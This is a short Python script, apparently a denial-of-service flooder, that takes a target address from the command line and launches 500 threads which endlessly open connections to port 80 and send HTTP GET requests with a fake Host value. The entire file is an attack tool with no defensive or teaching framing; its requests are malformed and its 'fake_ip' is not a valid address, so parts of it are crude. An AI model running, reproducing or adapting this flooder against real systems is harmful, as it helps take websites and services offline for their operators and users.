import socket
import sys
import threading

# vítima
target = sys.argv[1]
fake_ip = '503.032.320.222'
port = 80

times_connected = 0

def dos():
    while True:
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.connect((target, port))    
            server.sendto(("GET / "+ target +" HTTP/1.1\r\n").encode('ascii'), (target, port))
            server.sendto(("Host: " + fake_ip + " HTTP/1.1\r\n\r\n").encode('ascii'), (target, port))
            server.close()
        except:
            continue

        global times_connected
        times_connected += 1

        if times_connected % 500 == 0:
            print(times_connected)

for i in range(500):
    thread = threading.Thread(target=dos)
    thread.start()
